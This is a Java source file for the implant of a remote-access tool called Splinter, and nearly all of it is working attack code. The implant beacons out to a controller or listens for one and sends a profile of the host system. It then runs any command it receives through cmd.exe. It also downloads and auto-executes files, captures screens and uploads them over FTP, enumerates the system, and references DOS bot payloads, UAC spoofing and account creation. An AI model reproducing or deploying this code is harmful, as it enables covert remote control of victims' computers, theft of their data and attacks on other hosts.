/**
 * Welcome to the implant!!!!!!!!!
 * 
 * This is the agent that establishes a connection to Splinter Controller
 * 
 * @author Solomon Sonya
 */


package Implant;

import java.awt.*;
import java.awt.event.*;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.*;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.Scanner;
import Implant.Payloads.DOS_Bot.*;
import Implant.Payloads.DOS_Bot.FTP_DOS_Bot.DOS_Bot_FTP_Director;
import Implant.Payloads.DOS_Bot.HTTP_DOS_Bot.DOS_Bot_WEB;


import Implant.Payloads.*;
import javax.swing.*;
import javax.swing.filechooser.FileSystemView;

import Controller.Drivers.Drivers;
import Controller.GUI.Object_FileBrowser;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Receiver;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;
import Implant.FTP.Encoded_File_Transfer.File_Receiver;
import Implant.Payloads.*;



public class Splinter_IMPLANT extends Thread implements Runnable, ActionListener
{

	Worker_Thread_Payloads beaconWorkerThread = null;
	
	static String strMyClassName = "Splinter_IMPLANT";
	
	EnumerateSystem enumeration = null;
	
	public static final String OMIT_READING_OUTPUT_STREAMS_UPON_COMMAND_EXECUTION = "&";//special trap chars to let us know if we'll read from the output or omit returning the output to the user
	
	String strAddrToController = "";
	int portToController = 0;
	boolean beaconUponDisconnection = false;
	boolean beaconToControllerImmediatelyUponDisconnection = false;
	int beaconInterval_millis = 0;
	
	boolean respondToTimerInterrupt = false;
	
	Timer tmrBeacon = null;
	
	LinkedList<String> llHostFile = null;
	LinkedList<String> llUserAccountCreationFile = null;
	
	public static volatile LinkedList<DOS_Bot_WEB> llDOS_Orbiter_Directors_WEB = null;
	public static volatile LinkedList<DOS_Bot_FTP_Director> llDOS_Orbiter_Directors_FTP = null;
	
	public volatile boolean  continueRun = true;
	
	public String myUniqueDelimiter = "";
	public String randomNumberReceived = "";
	public String confirmation_agent_ID_from_CONTROLLER = "";
	
	public BufferedReader brIn = null;
	public PrintWriter pwOut = null;
	
	public volatile boolean initialConnectionEstablished = false;
	
	public Socket sktMyConnection = null;
	
	String myHandShake = null;
	
	MapSystemProperties systemMap = null;
	
	boolean listeningMode = false;
	
	Process process = null;
	BufferedReader process_IN = null;
	BufferedReader process_IN_ERROR = null;
	PrintWriter process_OUT = null;
	
	//public String CURRENT_WORKING_DIRECTORY = "";
	
	//volatile File fleCurrentWorkingDirectory = null;
	
	volatile Timer tmrRunningProcessList = null;
	volatile boolean processInterrupt_RunningProcessList = false;
	volatile ArrayList<String> alRunningProcessList = null;
	volatile Process proc = null;
	
	volatile long disconnectionCount = 0;
	
	public BufferedReader brIn_WorkerThread = null;
	
	FileSystemView fsv = null;
	File myFileBrowserCurrentFile = null;
	File myFileBrowserNewFile = null;
	File [] arrFileRoot = null;
	File [] arrFileList = null;
	
	public volatile boolean i_am_connected_to_relay = false;
	public volatile boolean i_am_beacon_implant = false;
	public volatile boolean beacon_provide_response = false;
	public volatile boolean beacon_has_sent_handshake = false;
	public volatile boolean i_am_called_from_beacon_agent = false;
	public volatile boolean i_am_a_listener_agent = false;
	
	public volatile LinkedList<File_Receiver>list_file_receivers = null;
	public volatile File_Receiver file_receiver_curr = null;
	
	String accountCreationName = "", accountCreationPassword = "", accountCreationAction_ADD_or_DEL;
	
	Frame_SpoofUAC spoof = null;//only allow one to be open at a time. any new frames, close the current and display the new one
	
	/**
	 * BEACON
	 * 
	 * @param controllerAddr
	 * @param controllerPort
	 * @param enableBeaconingUponDisconnection
	 * @param reconnectImmediatelyUponDisconnection
	 * @param beaconIntvl_millis
	 */
	public Splinter_IMPLANT(String strControllerAddie, int controllerPort, boolean enableBeaconingUponDisconnection, boolean reconnectImmediatelyUponDisconnection, int beaconIntvl_millis)
	{
		try
		{
			strAddrToController = strControllerAddie;
			portToController = controllerPort;
			beaconUponDisconnection = enableBeaconingUponDisconnection;
			beaconToControllerImmediatelyUponDisconnection = reconnectImmediatelyUponDisconnection;
			beaconInterval_millis = beaconIntvl_millis;
			Driver.alConnectedFTPClients = new ArrayList<FTP_Thread_Receiver>();
			
			/*if(enableBeaconingUponDisconnection || reconnectImmediatelyUponDisconnection || beaconIntvl_millis > 0)
			{
				this.i_am_beacon_implant = true;
				this.i_am_called_from_beacon_agent = true;
			}*/
		}
		catch(Exception e)
		{
			Driver.eop("Constructor - Implant", "Splinter_IMPLANT", e, e.getLocalizedMessage(), false);
		}
	}//end implant constructor mtd
	
	
	/*********************************************************************************************
	 * 
	 * BEACON IMPLANT
	 * 
	 * 
	 * 
	 * @param listen_port
	 **********************************************************************************************/
	public Splinter_IMPLANT(String strControllerAddie, int controllerPort, int beaconIntvl_millis)
	{
		try
		{
			strAddrToController = strControllerAddie;
			portToController = controllerPort;
			beaconUponDisconnection = true;
			beaconToControllerImmediatelyUponDisconnection = false;
			beaconInterval_millis = beaconIntvl_millis;
			Driver.alConnectedFTPClients = new ArrayList<FTP_Thread_Receiver>();
			
			this.i_am_beacon_implant = true;
			this.i_am_called_from_beacon_agent = true;
		}
		catch(Exception e)
		{
			Driver.eop("Constructor - True Beacon", "Splinter_IMPLANT", e, e.getLocalizedMessage(), false);
		}
	}//end implant constructor mtd
	
	
	/*********************************************************************************************
	 * 
	 * SERVER SOCKET FOR JUST ONE CONNECTION!
	 * 
	 * 
	 * 
	 * @param listen_port
	 **********************************************************************************************/
	public Splinter_IMPLANT(int listen_port, Socket sktConnection)
	{
		try
		{
			//we are here, this means establish the server socket, depending on the input parameters, we may handle only one connection, or handle multiple connections
			//Solo, to allow multiple create seperate serversocket thread class to spawn new implant instances upon each connection
			sktMyConnection = sktConnection;
			this.i_am_a_listener_agent = true;
			listeningMode = true;
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor - Listener", "Splinter_IMPLANT", e, e.getLocalizedMessage(), false);
		}
	}
	
	public void run()
	{
		try
		{
			//store start time
			try
			{
				Driver.startTime = System.currentTimeMillis();				
			}
			catch(Exception e)
			{
				Driver.sop("unable to store start time!");
			}
		
			//
			//BEACON IMPLANT
			//
			if(this.i_am_beacon_implant)
			{
				//
				//First register with controller and allow this mtd to handle calling the worker thread upon successful connection
				//
				
				if(this.beaconWorkerThread != null)
				{
					//kill it and start over
					this.beaconWorkerThread.killThisThread = true;
				}
	
				this.beaconWorkerThread = new Worker_Thread_Payloads(beaconInterval_millis, this,Worker_Thread_Payloads.PAYLOAD_BEACON_TO_CONTROLLER, null, strAddrToController, portToController, null, null);
				
				
			}
			
			//
			//ALL OTHER IMPLANTS
			//
			else if(sktMyConnection == null)
			{
				//establish the socket out to connect to the controller
				//once connected, let that method handle calling the listen to the  socket function
				startImplant();
			}
			else//we already have a socket established... i.e. this implant is in listening mode! the server socket already accepted a new socket for us. thus wait to act upon what we receive
			{
				//simply call listen to the socket to handle our infinite while on the socket
				this.listenToSocket(sktMyConnection);
				
				//we just made it here... meaning the socket has closed, remove this thread from the arraylist
				Driver.removeThread(this, this.getId());
				
				Driver.sop("Connection has been closed. Terminating this thread...");
				continueRun = false;
			}
			
			
			
			while(System.in.read() > 0 && continueRun)
			{
				//just wait here for appropriate interrupt
			}
		}
		catch(Exception e)
		{
			Driver.eop("run", strMyClassName, e, "", false);
		}
	}
	
	public boolean listenToSocket(Socket sktConnection)
	{
		try
		{
			/***
			 * 
			 * SOCKET CONNECTION WAS SUCCESSFUL!!!!!
			 * 
			 */						
			
			//determine command!
			String inputLine = "";
			brIn= null;
			pwOut = null; 
			initialConnectionEstablished = true;
							
			if(sktConnection != null)
			{
				//good connection! open readers and determine command!
				
				//open streams
				Driver.sp("Connection established!  Attempting to open streams on socket...");
				
				//input from implant
				brIn = new BufferedReader(new InputStreamReader(sktConnection.getInputStream()));
				
				//output to implant
				pwOut = new PrintWriter(new BufferedOutputStream(sktConnection.getOutputStream()));
				
				//Streams opened
				Driver.sop("Streams opened");
				
				//get connection data
				/*myLocalControllerPort = sktMyConnection.getLocalAddress().toString();
				myLocalController_IP = "" + sktMyConnection.getLocalPort();
				myVictim_RHOST_IP = "" + sktMyConnection.getInetAddress().toString();
				myRemote_RHOST_Port = "" + sktMyConnection.getPort();*/
				
				//Handshake!					
				
				String handShakeData = Driver.getHandshakeData(Driver.delimeter_1);
				
				if(this.i_am_beacon_implant && !beacon_provide_response && !beacon_has_sent_handshake)
				{
					this.sendToController(Driver.SPLINTER_BEACON_INITIAL_REGISTRATION + handShakeData, false, false);
					beacon_has_sent_handshake = true;
				}
				else if(this.i_am_beacon_implant /*&& beacon_provide_response*/)
				{
					this.sendToController(Driver.SPLINTER_BEACON_RESPONSE_HEADER + confirmation_agent_ID_from_CONTROLLER/* + Driver.delimeter_2 + handShakeData*/, false, false);
					
					//randomNumberReceived = brIn.readLine();
					
					//stop here and proceed to send the data
					return true;
				}
				else
				{
					this.sendToController(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + handShakeData, false, false);
				}				
				
				
				//read myUniqueID
				randomNumberReceived = brIn.readLine();
				
				//Format unique ID
				//this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + randomNumberReceived + "]";
				this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + randomNumberReceived + "]";
				
				Driver.sop("HandShake complete. " + myUniqueDelimiter);
				
				if(this.i_am_beacon_implant)
				{
					//
					//Stop here, we have registration information, all beacon to continue its request in Worker_Thread
					//
					return true;
				}
				
				//bind to cmd.exe!
				this.executeCommand(" ");//send blank terminal to user
				
				//INFINITE WHILE!!!
				
				//while(continueRun && !sktMyConnection.isClosed() && (!(inputLine = brIn.readLine()).equals(Driver.DISCONNECT_TOKEN)) && inputLine != null)//listen until agent says disconnect
				while(continueRun && !sktConnection.isClosed() && ((inputLine = brIn.readLine()) != null && !inputLine.equals(Driver.DISCONNECT_TOKEN) && !inputLine.equals(Driver.KILL_TOKEN)) )//listen until agent says disconnect
				{
					/*if(inputLine == null || inputLine.trim().equals(""))
						continue;*/ //allow blank lines to possibly refresh the screen for the controller
					
					/*if(dataAcquisitionComplete)
					{
						continue;//do not post received message below
					}*/
					
					//System.out.println("\nin " + strMyClassName + " received line: " + inputLine);
					
					//HANDLE SPLINTER IMPLANT SPECIFICALLY
					if(inputLine.trim().startsWith(myUniqueDelimiter) || inputLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION))
					{
						
						
						if(!determineCommand(inputLine))
						{
							//error on line received, try to execute whatever we just received
							executeCommand(inputLine);
						}
						continue;
					}
					
					if(inputLine == null)
						continue;
					
					//line did not match a special delimeter, try to execute whatever we just received
					executeCommand(inputLine);
					
				//return to top of while to receive next command to execute
			}//end while
				
			//if we received the disconnect notice, terminate program
			if(inputLine.equals(Driver.DISCONNECT_TOKEN))//throws null pointer exception if disconnected!
			{
				
				
				//there's no way to kill it if it's called from a worker thread
				if(i_am_called_from_beacon_agent || this.i_am_beacon_implant)
				{
					try
					{
						Driver.sop("Disconnection notice received. I am a beacon. Closing socket...");
						
						this.sktMyConnection.close();
					}catch(Exception ee){}
				}
				else if(i_am_a_listener_agent)
				{
					try
					{
						Driver.sop("Disconnection notice received. I am a listener. Closing socket...");
						
						this.sktMyConnection.close();
					}catch(Exception ee){}
				}
				/*else
				{
					Driver.sop("Disconnection notice received. Terminating program...");
					System.exit(0);
				}*/
			}
			
			else if(inputLine.equals(Driver.KILL_TOKEN))//throws null pointer exception if disconnected!
			{				
				System.exit(0);
			}
				
		}// end if sktConnection != null
			
			return true;
		}
		catch(NullPointerException npe)
		{
			Driver.sop("* Streams closed!");
		}
		catch(SocketException se)
		{
			Driver.sop("Streams closed!!!");
		}
		catch(Exception e)
		{
			Driver.eop("listenToSocket", strMyClassName, e, e.getLocalizedMessage(), false);			
		}
		
		return false;
	}
	
	public boolean startImplant()
	{
		try
		{
			
			
			//HA!!!! A DO/WHILE.... I THINK THIS IS THE 2ND DO/WHILE I'VE EVER USED IN REAL-LIFE!
			do
			{ 
				//connect to controller. if unsuccessful, it will throw Exception and hadle it here
				try
				{
					Driver.sp("\n" + Driver.getTimeStamp_Without_Date() + " - Attempting to connect to \"" + strAddrToController + ":" + portToController + "\"...");
					
					if(strAddrToController != null && strAddrToController.trim().equalsIgnoreCase("localhost"))
					{
						strAddrToController = "127.0.0.1";
					}
					
					//open the socket connection!!!
					sktMyConnection = new Socket(strAddrToController, portToController);
					
					//APPEARS WE HAVE A NEW CONNECTION, VERIFY IT'S NOT NULL
					if(sktMyConnection == null)
					{
						throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");//this should never happen
					}
				}
				catch(Exception e)
				{
					//CONNECTION UNSUCCESSFUL!!!!!
					
					if(beaconToControllerImmediatelyUponDisconnection)
					{
						if(!initialConnectionEstablished)
						{
							beaconInterval_millis = 4 * 1000;//delay for 4 secs
							
							Driver.sop("Initial connection unsuccessful.  Delaying " + beaconInterval_millis/1000 + " secs and attempting to connect one more time to connect");
							beaconToControllerImmediatelyUponDisconnection = false;
							
							//give a 4 sec delay
							
							if(tmrBeacon != null && tmrBeacon.isRunning())
							{
								try
								{
									tmrBeacon.stop();
								}catch(Exception ee){}
							}
							
							respondToTimerInterrupt = true;							
							tmrBeacon = new Timer(4000, this);
							tmrBeacon.start();
							
						}
						
						
						//Driver.sop("Unable to connect to \"" + strAddrToController + " : " + portToController + "\"");
						//return startImplant();
					}
					
					else if(beaconUponDisconnection)
					{
						Driver.sop("Unable to connect to \"" + strAddrToController + ":" + portToController + "\"" + " Sleeping for " + beaconInterval_millis/1000 + " secs before attempting to re-establish connection to controller");
						respondToTimerInterrupt = true;
						tmrBeacon = new Timer(beaconInterval_millis, this);
						tmrBeacon.start();
						return true;						
					}
					
					else//no beacon is not set, unable to connect. close the program
					{
						throw new IOException("Unable to connect to \"" + strAddrToController + " : " + portToController + "\"" + " beaconing is not set. Terminating program...");
					}
					
				}
				
				
				listenToSocket(sktMyConnection);
				
				
					
				
				
				/*************
				 * 
				 * 
				 * CONNECTION CLOSED!
				 * 
				 * 
				 * 
				 * 
				 */
				
				//connection closed, check if we beacon back to controller after time elapses
				if(beaconToControllerImmediatelyUponDisconnection)
				{
					//only try this for 20 attempts, and then start sleeping and attempting to reconnect every 5 or so minutes
										
					if((++disconnectionCount)%100 == 0)
					{
						
						
						beaconToControllerImmediatelyUponDisconnection = false;
						beaconInterval_millis  = 60000;
						Driver.sop("\n***\n*\n*Threshold reached. Controller not responding. Waiting: " + beaconInterval_millis/1000 + " sec before reconnect\n*\n*\n***\n");
					}
					
					return startImplant();
					//startImplant();
				}
				
				if(beaconUponDisconnection && !beaconToControllerImmediatelyUponDisconnection && beaconInterval_millis > 1000)
				{
					//progressively prolong duration between next connects to keep from crashing
					if((++disconnectionCount)%100 == 0)
					{						
						beaconInterval_millis  = beaconInterval_millis*2;
						if(beaconInterval_millis > 3e6)
						{
							beaconInterval_millis = (int)3e6;
						}
						Driver.sop("Threshold reached. Controller not responding, waiting: " + beaconInterval_millis/1000 + " seconds before reconnect");
					}
					
					//this.sleep(arg0)
					respondToTimerInterrupt = true;
					
					//establish the beacon interval to handle calling the reconnect mtd
					Driver.sop("Disconnected. Sleeping for " + beaconInterval_millis/1000 + " secs before re-establishing connection to controller");
					tmrBeacon = new Timer(beaconInterval_millis, this);
					tmrBeacon.start();
					return true;
				}
				
				//otherwise, immediately reconnect to controller!
				Driver.sop("Connection lost!  ");
				
			}while(beaconUponDisconnection);
			
			//We got here, disconnected from Controller and user chose not to beacon. terminate prog
			throw new IOException("Disconnected from controller.  Beacon is not set.  Terminating program...");
			
			
			//return true;
		}
		
		catch(IOException ioe)
		{
			//TERMINATE PROGRAM!!!!
			Driver.sop("Disconnected from controller.  * * *  Preparing to terminate program...");
			continueRun = false;
			
			//there's no way to kill it if it's called from a worker thread
			if(i_am_called_from_beacon_agent || this.i_am_beacon_implant)
			{
				try
				{
					Driver.sop("Beaconing is enabled. I am only closing the socket...");
					
					this.sktMyConnection.close();
				}catch(Exception ee){}
			}
			else if(i_am_a_listener_agent)
			{
				try
				{
					Driver.sop("Listener mode is set. I am only closing the socket...");
					
					this.sktMyConnection.close();
				}catch(Exception ee){}
			}
			else
			{
				Driver.sop("Processing disconnection. No alt mode set. Terminating Program...");
				
				System.exit(0); 
			}
			
		}
		
		catch(Exception e)
		{
			if(sktMyConnection != null && (sktMyConnection.isClosed() || !sktMyConnection.isConnected()))
			{
				Driver.sop("Socket is closed.");
				
				initialConnectionEstablished = false;
				
				//connection closed, check if we beacon back to controller after time elapses
				if(beaconToControllerImmediatelyUponDisconnection)
				{
					return startImplant();
				}
				
				if(beaconUponDisconnection && !beaconToControllerImmediatelyUponDisconnection && beaconInterval_millis > 1000)
				{
					//this.sleep(arg0)
					respondToTimerInterrupt = true;
					
					//establish the beacon interval to handle calling the reconnect mtd
					Driver.sop("Disconnected. Sleeping for " + beaconInterval_millis/1000 + " secs before connecting to controller");
					tmrBeacon = new Timer(beaconInterval_millis, this);
					tmrBeacon.start();
					return true;
				}
				
				//otherwise, terminate program
				Driver.sop("Terminating program...");
			}
			
			Driver.sop("Exception caught in startImplant mtd in " + this.strMyClassName + " Error msg: " + e.getLocalizedMessage());

			//e.printStackTrace(System.out);
		}
		
		return false;
		
	}
	
	/*public String getHandshakeData(String delimeter)
	{
		try
		{
			if(myHandShake == null)
			{
				systemMap = new MapSystemProperties(false);
				
				myHandShake = systemMap.strLaunchPath + delimeter + systemMap.strHOSTNAME + delimeter + systemMap.strOS_Name + delimeter + systemMap.strOS_Type + delimeter + systemMap.strUserName + delimeter + systemMap.strUSERDOMAIN + delimeter + systemMap.strTEMP + delimeter + systemMap.strUSERPROFILE + delimeter + systemMap.strPROCESSOR_IDENTIFIER + delimeter + systemMap.strNUMBER_OF_PROCESSORS + delimeter + systemMap.strSystemRoot + delimeter + systemMap.strServicePack + delimeter + systemMap.strNumUsers + delimeter + systemMap.strSerialNumber + delimeter + systemMap.strPROCESSOR_ARCHITECTURE + delimeter + systemMap.strCountryCode + delimeter + systemMap.strOsVersion + delimeter + systemMap.strHOMEDRIVE;; 
				
				try
				{
					if(systemMap.strLaunchPath == null || systemMap.strLaunchPath.trim().equals(""))
					{
						CURRENT_WORKING_DIRECTORY = "." + Driver.fileSeperator;
					}
					else
					{
						//if(systemMap.strLaunchPath.endsWith(Driver.fileSeperator))
						//	CURRENT_WORKING_DIRECTORY = systemMap.strLaunchPath;
						//else
						//	CURRENT_WORKING_DIRECTORY = systemMap.strLaunchPath + Driver.fileSeperator;
						
						if(systemMap.strLaunchDirectory.endsWith(Driver.fileSeperator))
							CURRENT_WORKING_DIRECTORY = systemMap.strLaunchDirectory;
						else
							CURRENT_WORKING_DIRECTORY = systemMap.strLaunchDirectory + Driver.fileSeperator;
					}
					
					
					
				}catch(Exception e){CURRENT_WORKING_DIRECTORY = "." + Driver.fileSeperator;}
				
				fleCurrentWorkingDirectory = new File(this.CURRENT_WORKING_DIRECTORY);
				
				//return already populated handshake
				return myHandShake;
			}
			
			else//return already populated handshake
			{
				return myHandShake;
			}
		}
		catch(Exception e)
		{
			Driver.eop("getHandshakeData", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return "";
	}*/
		
	public boolean sendToController(String lineToSend, boolean appendHeader, boolean printStatusToConsoleOut)
	{
		try
		{
			if(pwOut == null || this.sktMyConnection == null || !this.sktMyConnection.isConnected())
			{
				Driver.sop("socket not yet connected");
				return false;
			}
			
			if(appendHeader)
			{
				lineToSend = this.myUniqueDelimiter + lineToSend;
			}
			
			pwOut.println(lineToSend);
			pwOut.flush();
			
			if(printStatusToConsoleOut)
				Driver.sop(lineToSend);
			
			return true;
			
		}
		catch(Exception e)
		{
			Driver.eop("sendToController", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean determineCommand(String cmdLine)
	{
		try
		{			
			
			String [] cmd = cmdLine.split(Driver.delimeter_1);
			
			if(cmd[1] == null || cmd[1].trim().equals(""))
			{
				Driver.sop("Unspecified Command received: " + cmdLine);
				return false;
			}
			
			/*****************************************************************
			 * PAYLOAD MIGRATION - CREATE SAVE FILE
			 *****************************************************************/
			if(cmd != null && cmd[1].trim().startsWith(""+Driver.SERVICE_REQUEST_I_AM_SENDING_THIS_FILE))
			{								
				try
				{
					return Driver.initialize_file_receiver(cmd, this, null);
				}
				catch(Exception e)
				{
					Driver.sop("Could not initialize file receiver!!!");
				}
			}
			
			/*************************************************************************
			 * PAYLOAD MIGRATION - SAVE FILE CHUNK
			 *************************************************************************/
			if(cmd != null && cmd[1].trim().startsWith(""+Driver.SERVICE_RESPONSE_STORE_FILE_BYTE_CHUNK))
			{			
				String []args = cmd[2].split(Driver.delimiter_FILE_MIGRATION);
											
				//
				//Search through list of receivers for this one 
				//					
				for(int i = 0; this.list_file_receivers != null && i < this.list_file_receivers.size(); i++)
				{
					//retrieve list of all receivers for this current connection between receiver and sender
					//it is not a global (i.e. static) list, but a local list for the duration of this socket only!
					file_receiver_curr = list_file_receivers.get(i);
					
					try
					{
						if(file_receiver_curr.myID.trim().equalsIgnoreCase(args[0].trim()))
						{
							file_receiver_curr.write(args[1]);
							return true;
						}
						
					}
					catch(Exception e)
					{
						continue;
					}
				}
				
				return true;
			}
			
			
			/*************************************************************************
			 * PAYLOAD MIGRATION - FINISHED RECEIVIG FILE
			 *************************************************************************/
			if(cmd != null && cmd[1].trim().startsWith(""+Driver.SERVICE_RESPONSE_I_AM_FINISHED_SENDING_FILE))
			{
				//
				//parse the data
				//
				String []args = cmd[2].split(Driver.delimiter_FILE_MIGRATION);
									
				//
				//Search through list of receivers for this one 
				//					
				for(int i = 0; this.list_file_receivers != null && i < this.list_file_receivers.size(); i++)
				{
					file_receiver_curr = list_file_receivers.get(i);
					
					try
					{
						if(file_receiver_curr.myID.trim().equalsIgnoreCase(args[0].trim()))
						{
							Driver.sop("* * * * * Finished Receiving file: " + file_receiver_curr.fleMyFileOut.getCanonicalPath() + " - closing file now...");
							file_receiver_curr.osOut.close();
							
							//Drivers.jop_Warning("File Received from Sender: " + file_receiver_curr.fleMyFileOut, "File Transfer Complete");
							
							//
							//remove reference
							//
							this.list_file_receivers.remove(file_receiver_curr);
							
							//
							//Check if executing it
							//
							String id = args[0].trim();
							String filePathFromSender = args[1].trim();
							String saveFleName = args[2].trim();
							String execution_arguments = args[3].trim();
							String saveDirectory_on_Target = args[4].trim();
							String full_execution_cmd = args[5].trim();
							String execute_file_when_complete = args[6].trim();
							String execution_preamble = args[7].trim();
							boolean execute_file_upon_completion = true;
							
							try
							{
								if(execute_file_when_complete.trim().equals("") || execute_file_when_complete.trim().equalsIgnoreCase("no") || execute_file_when_complete.trim().equalsIgnoreCase("false"))
								{
									execute_file_upon_completion = false;
								}
								else
								{
									execute_file_upon_completion = true;
								}
							}
							catch(Exception e)
							{
								execute_file_upon_completion = true; Driver.sop("invalid execution upon completion flag provided");
							}
							
							//
							//EXECUTE FILE!!!
							//
							if(execute_file_upon_completion)
							{
								Driver.sop("File execution specified. LAUNCHING FILE NOW...");
								
								String execution = execution_preamble + " " + "\"" + file_receiver_curr.fleMyFileOut.getCanonicalPath() + "\"" + " " + execution_arguments;
								execution = execution.trim();
								
								Driver.sop("");
								Driver.sop("Executing: " + execution);
								
								String cmd_exe = "";
								
								
								if(execution_preamble == null || execution_preamble.trim().equals(""))
								{
									cmd_exe = "cmd.exe /C " + execution;
								}
								else
								{
									cmd_exe = execution;
								}
								
								//execute process and join streams so that controller gets feedback
								Process process = Runtime.getRuntime().exec(cmd_exe, null, new File("."));
								//Process process = Runtime.getRuntime().exec("cmd.exe /C " +  execution, null, new File("."));
								//now join the process together
								
								
								/*BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
								BufferedReader process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
											
								ProcessHandlerThread process_INPUT = new ProcessHandlerThread(execution, process, process_IN, this.pwOut);
								ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(execution, process, process_IN_ERROR, this.pwOut); 
								
								process_INPUT.start();
								process_INPUT_ERROR.start();*/
								
								//clean up the system
								System.gc();
							}
							
							//
							//dealloc
							//
							file_receiver_curr = null;
							
							
							return true;
						}
						
					}
					catch(Exception e)
					{
						continue;
					}
				}
			}
			
			
			/********************************************************
			 * BEACON AGENT ID
			 *********************************************************/
			if(cmd[0] != null && !cmd[0].trim().equals("") && cmd[0].equalsIgnoreCase(Driver.SET_IMPLANT_REGISTRATION))
			{
				//[0] == SET IMPLANT REGISTRATION
				//[1] == [IMPLANT REGISTRATION ID]
				
				this.confirmation_agent_ID_from_CONTROLLER = cmd[1];				
				return true;
			}
			
			/********************************************************
			 * SEND FILE
			 *********************************************************/
			if(cmd[1] != null && !cmd[1].trim().equals("") && cmd[1].equalsIgnoreCase(Driver.SEND_FILE_TO_CONTROLLER))
			{
				sendFile(cmd);
				return true;
			}
			
			/*******************************************************
			 * STOP PROCESS
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.STOP_PROCESS))
			{
				
				//[0] == [SPLINTER_IMPLANT]
				//[1] == STOP PROCESS
				
				ProcessHandlerThread.stopProcess = true;
				return true;
			}
			
			/*******************************************************
			 * CAPTURE SCREEN!!!
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.CAPTURE_SCREEN))
			{
				
				//[0] == [SPLINTER_IMPLANT]
				//[1] == CAPTURE_SCREEN
				//[2] == <SAVE DIRECTORY>
				//[3] == CONTROLLER FTP ADDRESS
				//[4] == CONTROLLER FTP PORT
				//[5] == 
				//[6] == 
				//[7] == 
				
				
				//String screenCaptureHeader = "" + System.currentTimeMillis() + "_screen capture";
				String screenCaptureHeader = "" + System.currentTimeMillis() + "_screenCapture";
				
				if(this.sendScreenCaptures(cmd, cmd[2], screenCaptureHeader))
				{
					//multiple sending of screens was successful, so exit, otherwise, fall through to send only main screen
					return true;
				}
				
				//send command to capture screen and place in windows temp path
				File fleScreenCaptureImage = Drivers.captureScreen(cmd[2], screenCaptureHeader);
				
				//if file is not null, we have a good capture, send it back to the controller!
				FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, cmd[3], Integer.parseInt(cmd[4]), FTP_ServerSocket.maxFileReadSize_Bytes, fleScreenCaptureImage, pwOut, true, FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES, null);
				FTP_Sender.start();
				
				return true;
			}
			
			/*******************************************************
			 * REAL TIME RUNNING PROCESS LIST!!!
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.RUNNING_PROCESS_LIST))
			{
				
				//[0] == [SPLINTER_IMPLANT]
				//[1] == RUNNING_PS
				//[2] == 
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				
				if(this.tmrRunningProcessList != null && tmrRunningProcessList.isRunning())
				{
					try
					{
						tmrRunningProcessList.stop();
					}catch(Exception ee){}
				}
				
				this.sendToController("Initiating Running Process List. Please stand by...", false, false);
				
				this.processInterrupt_RunningProcessList = true;							
				tmrRunningProcessList = new Timer(Driver.THREAD_RUNNING_PROCESS_LIST_INTERVAL_MILLIS, this);
				tmrRunningProcessList.start();
				
				return true;
			}
			
			/*******************************************************
			 * STOP THE RUNNING PROCESS LIST
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.STOP_RUNNING_PROCESS_LIST))
			{
				
				//[0] == [SPLINTER_IMPLANT]
				//[1] == STOP_RUNNING_PS
				//[2] == 
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				
				if(this.tmrRunningProcessList != null)
				{
					try
					{
						tmrRunningProcessList.stop();
					}catch(Exception ee){}
				}
				
				this.sendToController("Running Process Halted.", false, false);
				
				return true;
			}
			
			/*******************************************************
			 * ENUMERATE SYSTEM
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.ENUMERATE_SYSTEM))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == ENUMERATE
				//[2] == <SAVE DIRECTORY>
				//[3] == CONTROLLER FTP ADDRESS
				//[4] == CONTROLLER FTP PORT
				//[5] == 
				//[6] == 
				//[7] == 
				
				/*try
				{
					if(enumeration != null && enumeration.isAlive())
					{
						enumeration.stop();
					}
				}catch(Exception e){}*/
				
				enumeration = new EnumerateSystem(cmd[2], cmd[3], Integer.parseInt(cmd[4]), pwOut);
				enumeration.start();
			}
			
			/*******************************************************
			 * HARVEST BROWSING HISTORY
			 *******************************************************/
			/*if(cmd[1].trim().equalsIgnoreCase(Driver.HARVEST_BROWSER_HISTORY))
			{
			http://stackoverflow.com/questions/1399126/java-util-zip-recreating-directory-structure
			http://ellisweb.net/2008/09/where-does-google-chrome-store-user-history-profile-and-bookmarks/
			http://stackoverflow.com/questions/4773778/creating-zip-archive-in-java
			http://stackoverflow.com/questions/2056221/recursively-list-files-in-java
			
				//[0] == [SPLINTER_IMPLANT]
				//[1] == HARVEST_BROWSER_HISTORY
				//[2] == <SAVE DIRECTORY>
				//[3] == CONTROLLER FTP ADDRESS
				//[4] == CONTROLLER FTP PORT
				//[5] == 
				//[6] == 
				//[7] == 
				
				//PUNT!!!! I'M GONNA HAVE TO REVISIT THIS LATER!
				this.sendToController("Sorry, this feature is not yet supported", false, false);
				return false;
				
				//TAKE A DIRECTORY LISTING OF THE CHROME, INTERNET EXPLORER BROSING HISTORIES
				File directoryToList = null;
				
				
				//try XP
